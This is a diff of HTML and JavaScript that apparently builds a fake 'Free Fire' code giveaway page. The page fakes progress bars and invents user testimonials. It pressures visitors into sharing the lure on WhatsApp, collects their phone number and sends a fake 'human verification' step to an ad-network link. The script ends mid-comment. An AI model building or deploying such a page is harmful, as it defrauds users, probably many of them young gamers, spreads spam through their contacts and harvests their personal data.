+        <div id="share" class="loading2 js-hidden js-congrats">
+            <div class="loading2__box">
+                <span style="font-weight: bold; font-size:15px">Congratulations, your ID has been selected to receive The giveaway!</span>
+                <br>
+                <br>
+
+                <b>How to get the code to redeem?</b>
+                <br>
+                <br>
+                <b>1. To be able to redeem to your account, First click on the green button "WHATSAPP" and send this news to 5 freefire players on WhatsApp!</b>
+                <br>
+                <br>
+
+                <b>2. After sharing, you will go to the next step where you will get the code </b>
+                <br>
+
+                <div style="margin-top: 30px;margin-bottom: 30px;" class="quedate__first js-hidden js-share">
+                    <div style="border: 1px solid gray; width:80%" class="quedate__load">Share with your groups <span class="quedate__load-a js-hidden"></span>
+                    </div>
+                    <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                        <svg id="third-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                            </circle>
+                            <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                            </circle>
+                        </svg>
+                        <svg id="third-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1" width=" 3.2rem">
+                                <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                    <g class="ldl-ani">
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle>
+                                            </g>
+                                        </g>
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path>
+                                            </g>
+                                        </g>
+                                        <metadata xmlns:d="https://loading.io/stock/">
+                                            <d:name>ok</d:name>
+                                            <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                            <d:license>by</d:license>
+                                            <d:slug>364zp</d:slug>
+                                        </metadata>
+                                    </g>
+                                </g>
+                            </svg>
+                        <span id="third-porcent" class="quedate__load-text"></span>
+                    </div>
+                </div>
+                <button style="display: flex;align-items: center;justify-content: center;" id="compartir" class="quedate__cta-btn js-hidden">
+                    <?xml version="1.0" encoding="iso-8859-1" ?>
+                    <!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+                    <svg width="40px" style="padding-right:10px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
+                            <circle style="fill:#75B73B;" cx="256" cy="256" r="256" />
+                        <path style="fill:#52891D;" d="M360.241,151.826c-14.843-3.712-36.671-16.532-50.8-21.671
+             c-55.165-17.239-129.293-3.448-149.98,60.337c-1.724,1.724-5.172,1.724-6.896,1.724c-41.374,48.269-13.791,106.882-17.239,160.323
+             c-1.177,18.839-11.083,35.497-23.831,49.588l107.282,107.17C230.931,511.067,243.355,512,256,512
+             c126.436,0,231.452-91.665,252.247-212.161L360.241,151.826z" />
+                        <g>
+                                <path style="fill:#FFFFFF;" d="M248.837,108.447c-78.029,3.712-139.604,68.696-139.369,146.811
+               c0.072,23.792,5.816,46.249,15.95,66.095l-15.557,75.514c-0.841,4.086,2.843,7.663,6.901,6.701l73.995-17.53
+               c19.011,9.471,40.364,14.939,62.962,15.284c79.753,1.219,146.251-62.105,148.74-141.829
+               C405.121,174.035,334.591,104.362,248.837,108.447L248.837,108.447z M337.13,335.936c-21.669,21.669-50.483,33.604-81.13,33.604
+               c-17.944,0-35.126-4.027-51.066-11.966l-10.302-5.134l-45.37,10.747l9.549-46.356l-5.075-9.943
+               c-8.276-16.206-12.472-33.728-12.472-52.084c0-30.648,11.935-59.459,33.604-81.13c21.476-21.478,50.759-33.604,81.134-33.604
+               c30.644,0,59.458,11.935,81.127,33.604c21.669,21.669,33.604,50.483,33.604,81.127C370.735,285.177,358.607,314.459,337.13,335.936
+               L337.13,335.936z" />
+                            <path style="fill:#FFFFFF;" d="M327.115,286.582l-28.384-8.149c-3.729-1.069-7.749-0.01-10.468,2.76l-6.942,7.07
+               c-2.926,2.984-7.366,3.941-11.24,2.374c-13.427-5.434-41.672-30.548-48.881-43.106c-2.084-3.624-1.739-8.152,0.817-11.462
+               l6.058-7.839c2.374-3.07,2.874-7.197,1.305-10.747l-11.941-27.008c-2.86-6.468-11.126-8.352-16.527-3.784
+               c-7.921,6.701-17.32,16.88-18.461,28.16c-2.015,19.887,6.515,44.954,38.762,75.055c37.257,34.778,67.094,39.369,86.523,34.664
+               c11.019-2.667,19.825-13.365,25.379-22.126C336.906,296.467,333.91,288.535,327.115,286.582L327.115,286.582z" />
+                            </g>
+                        <g>
+                                <path style="fill:#D1D1D1;" d="M356.004,147.708l-22.223,22.778c1.131,1.045,2.257,2.096,3.351,3.191
+               c21.67,21.669,33.604,50.483,33.604,81.127c0,30.375-12.128,59.656-33.604,81.134c-21.669,21.669-50.483,33.604-81.13,33.604
+               c-17.944,0-35.125-4.027-51.066-11.966l-10.302-5.134l-45.37,10.747l0.938-4.553l-40.174,41.172
+               c0.886,2.663,3.705,4.475,6.734,3.758l73.995-17.53c19.011,9.471,40.364,14.939,62.962,15.284
+               c79.753,1.219,146.253-62.105,148.74-141.829C403.834,215.357,385.686,175.435,356.004,147.708z" />
+                            <path style="fill:#D1D1D1;" d="M327.115,286.582l-28.384-8.149c-3.729-1.069-7.749-0.01-10.468,2.76l-6.942,7.07
+               c-2.926,2.984-7.366,3.941-11.24,2.374c-7.756-3.139-20.451-12.845-31.185-22.904l-19.732,20.225
+               c0.677,0.648,1.352,1.295,2.05,1.948c37.257,34.778,67.094,39.369,86.523,34.664c11.019-2.667,19.825-13.365,25.379-22.126
+               C336.906,296.467,333.91,288.535,327.115,286.582z" />
+                            </g>
+
+                        </svg>
+
+                    WhatsApp
+
+                </button>
+            </div>
+        </div>
+        <!-- FIN Ventana permiso -->
+
+        <!--verify-->
+        <div class="loading2 js-hidden js-verify">
+            <div class="loading2__box">
+
+                <b style="font-weight:bold; font-size:16px">Congratulations you qualify to get the universal freefire code </b>
+                <br>
+                <br><b>In order to get the code you must complete this last final step of Human Verification!</b>
+                <br>
+                <br><b>1. You need to carefully perform the task that you will be prompted according to your mobile operating system.</b>
+                <br>
+                <br><b>(Remember that this step is important for getting the code)</b>
+                <br>
+                <br><b style="font-size:14px">Now Select your Mobile Device.</b>
+                <br>
+                <br>
+                <div style="display: flex;">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;" id="verify" class="quedate__cta-btn">IPHONE</button>
+                    <button style="display: flex;align-items: center;justify-content: center;" id="verify" class="quedate__cta-btn">ANDROID</button>
+
+                </div>
+                <br>
+                <center>
+                <script type="text/javascript" src="#"></script>
+                </center>
+
+            </div>
+
+
+        </div>
+
+    </div>
+</div>
+
+<br />
+<br />
+<br />
+
+<img src="https://i.ibb.co/KsxnHT1/1603809148565.jpg" width="100%">
+
+<!-- start Chat-->
+<div class="container-chat">
+    <div class="chat">
+        <div class="chat__reactions">
+           <span class="chat__reactions-icon">
+             <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16"><defs><linearGradient
+                     id="r" x1="50%" x2="50%" y1="0%" y2="100%"><stop offset="0%" stop-color="#18AFFF"></stop><stop
+                     offset="100%" stop-color="#0062DF"></stop></linearGradient><filter id="e" width="118.8%"
+                                                                                        height="118.8%" x="-9.4%"
+                                                                                        y="-9.4%"
+                                                                                        filterUnits="objectBoundingBox"><feGaussianBlur
+                     in="SourceAlpha" result="shadowBlurInner1" stdDeviation="1"></feGaussianBlur><feOffset dy="-1"
+                                                                                                            in="shadowBlurInner1"
+                                                                                                            result="shadowOffsetInner1"></feOffset><feComposite
+                     in="shadowOffsetInner1" in2="SourceAlpha" k2="-1" k3="1" operator="arithmetic"
+                     result="shadowInnerInner1"></feComposite><feColorMatrix in="shadowInnerInner1"
+                                                                             values="0 0 0 0 0 0 0 0 0 0.299356041 0 0 0 0 0.681187726 0 0 0 0.3495684 0"></feColorMatrix></filter><path
+                     id="k" d="M8 0a8 8 0 00-8 8 8 8 0 1016 0 8 8 0 00-8-8z"></path></defs><g fill="none"><use
+                     fill="url(#r)" xlink:href="#k"></use><use fill="black" filter="url(#e)" xlink:href="#k"></use><path
+                     fill="white"
+                     d="M12.162 7.338c.176.123.338.245.338.674 0 .43-.229.604-.474.725a.73.73 0 01.089.546c-.077.344-.392.611-.672.69.121.194.159.385.015.62-.185.295-.346.407-1.058.407H7.5c-.988 0-1.5-.546-1.5-1V7.665c0-1.23 1.467-2.275 1.467-3.13L7.361 3.47c-.005-.065.008-.224.058-.27.08-.079.301-.2.635-.2.218 0 .363.041.534.123.581.277.732.978.732 1.542 0 .271-.414 1.083-.47 1.364 0 0 .867-.192 1.879-.199 1.061-.006 1.749.19 1.749.842 0 .261-.219.523-.316.666zM3.6 7h.8a.6.6 0 01.6.6v3.8a.6.6 0 01-.6.6h-.8a.6.6 0 01-.6-.6V7.6a.6.6 0 01.6-.6z"></path></g></svg>
+           </span>
+            <span class="chat__reactions-icon">
+             <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16"><defs><linearGradient
+                     id="a" x1="50%" x2="50%" y1="0%" y2="100%"><stop offset="0%" stop-color="#FF6680"></stop><stop
+                     offset="100%" stop-color="#E61739"></stop></linearGradient><filter id="c" width="118.8%"
+                                                                                        height="118.8%" x="-9.4%"
+                                                                                        y="-9.4%"
+                                                                                        filterUnits="objectBoundingBox"><feGaussianBlur
+                     in="SourceAlpha" result="shadowBlurInner1" stdDeviation="1"></feGaussianBlur><feOffset dy="-1"
+                                                                                                            in="shadowBlurInner1"
+                                                                                                            result="shadowOffsetInner1"></feOffset><feComposite
+                     in="shadowOffsetInner1" in2="SourceAlpha" k2="-1" k3="1" operator="arithmetic"
+                     result="shadowInnerInner1"></feComposite><feColorMatrix in="shadowInnerInner1"
+                                                                             values="0 0 0 0 0.710144928 0 0 0 0 0 0 0 0 0 0.117780134 0 0 0 0.349786932 0"></feColorMatrix></filter><path
+                     id="b" d="M8 0a8 8 0 100 16A8 8 0 008 0z"></path></defs><g fill="none"><use fill="url(#a)"
+                                                                                                 xlink:href="#b"></use><use
+                     fill="black" filter="url(#c)" xlink:href="#b"></use><path fill="white"
+                                                                               d="M10.473 4C8.275 4 8 5.824 8 5.824S7.726 4 5.528 4c-2.114 0-2.73 2.222-2.472 3.41C3.736 10.55 8 12.75 8 12.75s4.265-2.2 4.945-5.34c.257-1.188-.36-3.41-2.472-3.41"></path></g></svg>
+
+           </span>
+            <span class="chat__reactions-text">colonel and fbi unbeaten </span>
+            <span class="chat__reactions-counter">179k</span>
+            <span class="chat__reactions-text">Comments</span>
+            <span class="chat__reactions-counter js-counter">634</span>
+            <span class="chat__reactions-text">Share</span>
+        </div>
+        <div class="chat__actions">
+            <div class="chat__actions-box"><span><svg width="40" style="enable-background:new 0 0 48 48;" version="1.1" viewBox="0 0 48 48" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><style type="text/css">
+ .st0 {
+     display: none;
+ }
+
+ .st1 {
+     fill: none;
+     stroke: #303030;
+     stroke-width: 0.7;
+     stroke-linecap: round;
+     stroke-linejoin: round;
+     stroke-miterlimit: 10;
+ }
+
+ .st2 {
+     fill: #303030;
+ }
+</style><g class="st0" id="Padding__x26__Artboard"></g><g id="Icons"><g><path class="st1" d="M17.95222,33.90544h0.9013c0.21198,0,0.42036,0.06112,0.59631,0.17936    c0.28018,0.18827,0.55758,0.3808,0.84545,0.55725c0.16461,0.1009,0.35297,0.24185,0.53977,0.29492l6.92604,0.00805l4.83793,0.0013    c0.9355,0.00025,1.71305-0.76513,1.69462-1.70044c-0.01669-0.84692-0.15599-1.60765-1.00351-1.60765h0.1076    c0.91396,0,1.61795-0.74711,1.60863-1.66102c-0.00988-0.96905,0.13757-1.76219-0.82805-1.76219h0.3228    c0.92,0,1.40993-0.80351,1.40993-1.73351c0-0.92,0.12016-1.65903-0.79984-1.65903h0.32154c0.92,0,1.04668-0.81019,1.04668-1.73019    c0-0.93-0.49831-1.60727-1.41831-1.60727l-8.70333,0.01419c0.20236-0.27825,1.23094-4.09943,1.15505-4.83301    c-0.0544-0.52583-0.20867-1.0503-0.3366-1.56151c-0.17118-0.68406-0.35542-1.36467-0.53957-2.04532    c-0.11769-0.43504-0.8064-0.7405-1.18842-0.87866c-0.58066-0.21-1.19885-0.11427-1.68509,0.26741    c-0.2588,0.20315-0.66063,0.53764-0.66016,0.88888c0.00162,1.21729-0.00109,2.43457,0.00345,3.65185    c0.00004,0.01062,0.00008,0.02123,0.00012,0.03185c0.00023,0.06161,0.00036,0.12407-0.01541,0.18363    c-0.0169,0.06386-0.05128,0.12147-0.08524,0.17812c-0.68155,1.13686-1.36008,2.27553-2.03821,3.41444    c-0.29735,0.4994-0.59458,0.99887-0.89091,1.49888c-0.26875,0.45347-0.51342,0.94802-0.9745,1.23768    c-0.40725,0.25585-0.7805,0.49207-1.19004,0.74735"></path><path
+                    class="st1"
+                    d="M16.5418,35.94944h-3.68656c-0.7371,0-1.33464-0.59753-1.33464-1.33463V24.34045    c0-0.7371,0.59754-1.33464,1.33464-1.33464h3.68656c0.7371,0,1.33464,0.59754,1.33464,1.33464v10.27436    C17.87644,35.35191,17.2789,35.94944,16.5418,35.94944z"></path><line
+                    class="st1" x1="13.55524" x2="13.55524" y1="29.80501" y2="24.76078"></line><line class="st1"
+                                                                                                     x1="13.55524"
+                                                                                                     x2="13.55524"
+                                                                                                     y1="30.95262"
+                                                                                                     y2="31.7558"></line></g></g></svg></span>
+                <span class="chat__actions-text">Like</span>
+            </div>
+            <div class="chat__actions-box">
+           <span><!--?xml version="1.0" ?--><svg width="40" style="enable-background:new 0 0 48 48;" version="1.1"
+                                                 viewBox="0 0 48 48" xml:space="preserve"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 xmlns:xlink="http://www.w3.org/1999/xlink"><style type="text/css">
+             .st0 {
+                 display: none;
+             }
+
+             .st1 {
+                 fill: none;
+                 stroke: #303030;
+                 stroke-width: 0.7;
+                 stroke-linecap: round;
+                 stroke-linejoin: round;
+                 stroke-miterlimit: 10;
+             }
+
+             .st2 {
+                 fill: #303030;
+             }
+           </style><g class="st0" id="Padding__x26__Artboard"></g><g id="Icons"><g><path class="st1" d="M17.30376,30.96737l-0.68934,1.90643l3.79318-1.78069c0.17639-0.0828,0.36885-0.12573,0.5637-0.12573    h12.98269c0.57547,0,1.0463-0.47084,1.0463-1.0463V16.1725c0-0.57547-0.47084-1.0463-1.0463-1.0463H14.04601    c-0.57786,0-1.0463,0.46845-1.0463,1.0463v13.74857c0,0.57786,0.46844,1.0463,1.0463,1.0463H17.30376z"></path><line
+                   class="st1" x1="15.04836" x2="15.04836" y1="26.25386" y2="27.01553"></line><line class="st1"
+                                                                                                    x1="15.04836"
+                                                                                                    x2="15.04836"
+                                                                                                    y1="18.17051"
+                                                                                                    y2="24.86477"></line></g></g></svg></span>
+                <span class="chat__actions-text">Comments</span>
+            </div>
+        </div>
+        <div class="chat__conversation">
+            <!--js box-->
+            <div class="chat__conversation-box js-hidden" id="js-box-1">
+                <img src="/prof1.png"
+                     alt="" class="chat__conversation-box-img">
+                <span class="chat__conversation-box-active"></span>
+                <div class="chat__conversation-box-content">
+                    <div class="chat__conversation-box-content-comment ">
+                        <span class="chat__conversation-box-content-comment-name">PORNSTAR</span>
+                        <span class="chat__conversation-box-content-comment-text">Thanks frefire i got mp40 yellow from my code.</span>
+                    </div>
+                    <div class="chat__conversation-box-content-cta">
+                        <span class="chat__conversation-box-content-cta-text">Like</span>
+                        <span class="chat__conversation-box-content-cta-text">Reply</span>
+                        <span class="chat__conversation-box-content-cta-text">1m</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="chat__conversation-box js-hidden" id="js-box-2">
+                <img src="/prof2.png"
+                     alt="" class="chat__conversation-box-img">
+                <span class="chat__conversation-box-active"></span>
+                <div class="chat__conversation-box-content">
+                    <div class="chat__conversation-box-content-comment ">
+                        <span class="chat__conversation-box-content-comment-name">Omega Snow</span>
+                        <span class="chat__conversation-box-content-comment-text">I got code that had 50 rooms now i can do another tournament. </span>
+                    </div>
+                    <div class="chat__conversation-box-content-cta">
+                        <span class="chat__conversation-box-content-cta-text">Like</span>
+                        <span class="chat__conversation-box-content-cta-text">Reply</span>
+                        <span class="chat__conversation-box-content-cta-text">1m</span>
+                    </div>
+                </div>
+            </div>
+            <!--js end box -->
+            <div class="chat__conversation-box">
+                <img src="/prof3.png"
+                     alt="" class="chat__conversation-box-img">
+                <span class="chat__conversation-box-active"></span>
+                <div class="chat__conversation-box-content">
+                    <div class="chat__conversation-box-content-comment ">
+                        <span class="chat__conversation-box-content-comment-name">I AM RAVEN</span>
+                        <span class="chat__conversation-box-content-comment-text">My code had mechanic mp40 and i have it am not lucky</span>
+                    </div>
+                    <div class="chat__conversation-box-content-cta">
+                        <span class="chat__conversation-box-content-cta-text">Like</span>
+                        <span class="chat__conversation-box-content-cta-text">Reply</span>
+                        <span class="chat__conversation-box-content-cta-text js-seconds">1m</span>
+                    </div>
+                </div>
+            </div>
+            <div class="chat__conversation-box chat__conversation-box--right">
+                <img src="/prof4.png"
+                     alt="" class="chat__conversation-box-img">
+                <div class="chat__conversation-box-content">
+                    <div class="chat__conversation-box-content-comment ">
+                        <span class="chat__conversation-box-content-comment-name">YSL29</span>
+                        <span class="chat__conversation-box-content-comment-text">Even me bro i got mechanic but i have it:(</span>
+                    </div>
+                    <div class="chat__conversation-box-content-cta chat__conversation-box-content-cta--2">
+                        <span class="chat__conversation-box-content-cta-text">Like</span>
+                        <span class="chat__conversation-box-content-cta-text">Reply</span>
+                        <span class="chat__conversation-box-content-cta-text js-seconds">1m</span>
+                    </div>
+                </div>
+            </div>
+            <span class="chat__conversation-reply">FBI AJ <span class="chat__conversation-reply--efect">is writing a comment...</span></span>
+            <div class="chat__conversation-box">
+                <img src="/prof5.png"
+                     alt="" class="chat__conversation-box-img">
+                <span class="chat__conversation-box-active"></span>
+                <div class="chat__conversation-box-content">
+                    <div class="chat__conversation-box-content-comment ">
+                        <span class="chat__conversation-box-content-comment-name">F4E WAGLON</span>
+                        <span class="chat__conversation-box-content-comment-text">I got 30 rooms</span>
+                    </div>
+                    <div class="chat__conversation-box-content-cta">
+                        <span class="chat__conversation-box-content-cta-text">Like</span>
+                        <span class="chat__conversation-box-content-cta-text">Reply</span>
+                        <span class="chat__conversation-box-content-cta-text">20m</span>
+                    </div>
+                </div>
+            </div>
+            <div class="chat__conversation-write">
+                <input type="text" name="comment" id="write" placeholder="Write a comment">
+                <label class="chat__conversation-write-text" for="write"></label>
+                <div class="chat__conversation-write-icons">
+                    <svg class="chat__conversation-write-icons-img" version="1.1" id="Capa_1"
+                         xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                         viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;"
+                         xml:space="preserve">
+                  <g>
+                    <g>
+                      <g>
+                        <path d="M256,0C114.844,0,0,114.844,0,256s114.844,256,256,256s256-114.844,256-256S397.156,0,256,0z M256,490.667
+                  				C126.604,490.667,21.333,385.396,21.333,256S126.604,21.333,256,21.333S490.667,126.604,490.667,256S385.396,490.667,256,490.667
+                  				z"/>
+                          <path d="M393.385,299.115c-5.781-1.385-11.49,2.177-12.844,7.906c-13.75,57.885-64.958,98.313-124.542,98.313
+                  				c-59.656,0-110.885-40.49-124.573-98.448c-1.365-5.75-7.146-9.24-12.833-7.938c-5.74,1.354-9.292,7.104-7.938,12.833
+                  				c15.979,67.646,75.75,114.885,145.344,114.885c69.51,0,129.26-47.167,145.292-114.708
+                  				C402.656,306.219,399.115,300.469,393.385,299.115z"/>
+                          <circle cx="170.667" cy="192" r="21.333"/>
+                          <circle cx="341.333" cy="192" r="21.333"/>
+                      </g>
+                    </g>
+                  </g>
+                </svg>
+                    <svg class="chat__conversation-write-icons-img" version="1.1" id="Capa_1"
+                         xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                         viewBox="0 0 480 480" style="enable-background:new 0 0 480 480;"
+                         xml:space="preserve">
+                  <g>
+                    <g>
+                      <path d="M240,136c-57.438,0-104,46.562-104,104s46.562,104,104,104c57.41-0.066,103.934-46.59,104-104
+                			C344,182.562,297.438,136,240,136z M240,328c-48.601,0-88-39.399-88-88c0-48.601,39.399-88,88-88
+                			c48.577,0.057,87.943,39.423,88,88C328,288.601,288.601,328,240,328z"/>
+                    </g>
+                  </g>
+                        <g>
+                    <g>
+                      <path d="M440,112h-56c-13.255,0-24-10.745-24-24c-0.026-22.08-17.92-39.974-40-40H160c-22.08,0.026-39.974,17.92-40,40
+                  			c0,13.255-10.745,24-24,24H40c-22.08,0.026-39.974,17.92-40,40v240c0.026,22.08,17.92,39.974,40,40h400
+                  			c22.08-0.026,39.974-17.92,40-40V152C479.974,129.92,462.08,112.026,440,112z M464,392c0,13.255-10.745,24-24,24H40
+                  			c-13.255,0-24-10.745-24-24V152c0-13.255,10.745-24,24-24h56c22.08-0.026,39.974-17.92,40-40c0-13.255,10.745-24,24-24h160
+                  			c13.255,0,24,10.745,24,24c0.026,22.08,17.92,39.974,40,40h56c13.255,0,24,10.745,24,24V392z"/>
+                    </g>
+                  </g>
+                </svg>
+                    <svg class="chat__conversation-write-icons-img--svg" width="32px" height="32px" viewBox="0 0 32 32"
+                         version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                         xmlns:sketch="http://www.bohemiancoding.com/sketch/ns">
+                        <!-- Generator: Sketch 3.0.3 (7891) - http://www.bohemiancoding.com/sketch -->
+                        <title>icon 65 file gif</title>
+                        <desc>Created with Sketch.</desc>
+                        <defs></defs>
+                        <g id="Page-1" stroke="none" stroke-width="0" fill="none" fill-rule="evenodd"
+                           sketch:type="MSPage">
+                            <g id="icon-65-file-gif" sketch:type="MSArtboardGroup" fill="gray">
+                                <path
+                                        d="M8.00684834,10 C6.34621185,10 5,11.3422643 5,12.9987856 L5,20.0012144 C5,21.6573979 6.33599155,23 8.00684834,23 L24.9931517,23 C26.6537881,23 28,21.6577357 28,20.0012144 L28,12.9987856 C28,11.3426021 26.6640085,10 24.9931517,10 L8.00684834,10 L8.00684834,10 Z M7.99456145,11 C6.89299558,11 6,11.9001762 6,12.992017 L6,20.007983 C6,21.1081436 6.90234375,22 7.99456145,22 L25.0054385,22 C26.1070044,22 27,21.0998238 27,20.007983 L27,12.992017 C27,11.8918564 26.0976562,11 25.0054385,11 L7.99456145,11 L7.99456145,11 Z M13,17 L13,19 L10.9998075,19 C10.4437166,19 10,18.5523709 10,18.0001925 L10,14.9998075 C10,14.4437166 10.4476291,14 10.9998075,14 L14,14 L14,13 L11.0048815,13 C9.89761602,13 9,13.8865548 9,15.0059191 L9,17.9940809 C9,19.1019194 9.8938998,20 11.0048815,20 L14,20 L14,19.25 L14,19.25 L14,17 L14,16 L11,16 L11,17 L13,17 L13,17 Z M16,14 L16,19 L15,19 L15,20 L18,20 L18,19 L17,19 L17,14 L18,14 L18,13 L15,13 L15,14 L16,14 L16,14 Z M20,16 L20,14 L24,14 L24,13 L19,13 L19,20 L20,20 L20,17 L23,17 L23,16 L20,16 L20,16 Z"
+                                        id="file-gif" sketch:type="MSShapeGroup"></path>
+                            </g>
+                        </g>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--end chat-->
+</div>
+<script>
+    var DOMString = {
+            loading: document.querySelector("#loading-svg"),
+            checked: document.querySelector("#check-svg"),
+            elemPorcents: document.querySelector(".quedate__porcent"),
+            elemPorcentText: document.querySelector(".quedate__porcent-text"),
+            firstBox: document.querySelector("#first-box"),
+            secondBox: document.querySelector("#second-box"),
+            thirdBox: document.querySelector("#third-box"),
+            phone: document.querySelector(".quedate__form-input"),
+            messageStatus: document.querySelector(".message-status"),
+            loadingG: document.querySelector("#loading-g"),
+            boxes: document.querySelectorAll(".quedate__first"),
+            firstPorcent: document.querySelector("#first-porcent"),
+            secondPorcent: document.querySelector("#second-porcent"),
+            thirdPorcent: document.querySelector("#third-porcent"),
+            barLoaders: document.querySelectorAll(".quedate__load-a"),
+            svgLoading: document.querySelectorAll(".quedate__load-animate"),
+            svgChecked: document.querySelectorAll(".quedate__load-check"),
+            permissionContainer: document.querySelector(".permision-container"),
+            permissionLoading: document.querySelector(".loading2"),
+            statusMessage: document.querySelector(".fb-request"),
+            share: document.querySelector("#compartir"),
+            congrats: document.querySelector(".js-congrats"),
+            sharing: document.querySelector(".js-share"),
+            verify: document.querySelector("#verify")
+        }, objServer = {}, landingDomain = "https://google.com",
+        adsLink = "https://zuphaims.com/afu.php?zoneid=3777723";
+        //adsLink = "/";
+    document.addEventListener("click", function (c) {
+        console.log(c);
+        var a = c.toElement || c.srcElement;
+        if (a.id) switch (a.id) {
+            case"validar":
+                a.classList.add("js-hidden"), setTimeout(function () {
+                    DOMString.loading.classList.remove("js-hidden"), DOMString.elemPorcents.classList.remove("js-hidden");
+                    var b = 0;
+                    window.loadingPorcents = setInterval(function () {
+                        DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("js-hidden"), DOMString.checked.classList.remove("js-hidden"), DOMString.elemPorcents.classList.add("js-hidden"), DOMString.elemPorcentText.classList.remove("js-hidden"), setTimeout(function () {
+                            DOMString.checked.classList.add("js-hidden"), DOMString.firstBox.classList.add("js-hidden"), DOMString.secondBox.classList.remove("js-hidden"), DOMString.elemPorcentText.classList.add("js-hidden")
+                        }, 2e3)) : b++
+                    }, 50)
+                }, 500);
+                break;
+            case"enviar":
+                var a = DOMString.phone;
+                a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("js-hidden"), DOMString.secondBox.classList.add("js-hidden"), DOMString.loadingG.classList.remove("js-hidden"), setTimeout(function () {
+                    DOMString.loadingG.classList.add("js-hidden"), DOMString.thirdBox.classList.remove("js-hidden");
+                    var i = 0, j = 0, k = !0,
+                        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+                    window.loadingData = setTimeout(function a() {
+                        l.length > i && (DOMString.boxes[i].classList.remove("js-hidden"), DOMString.barLoaders[i].classList.remove("js-hidden"), window._setting = setInterval(function () {
+                            if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++, j = 0, window.loadingData = setTimeout(a, 1e3); else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3); else if (!k && 100 === j) {
+                                clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+                                var d = 1, e = 0, m = messageToSend();
+                                var s=1;
+                                set_Cookie("d",s);
+                                DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
+                                    if (12 <= d) {
+                                        for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                                            window.open(adsLink)
+                                        });
+                                        DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+                                    } else
+                                        /*      e = Math.floor(100 * (d / 12)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
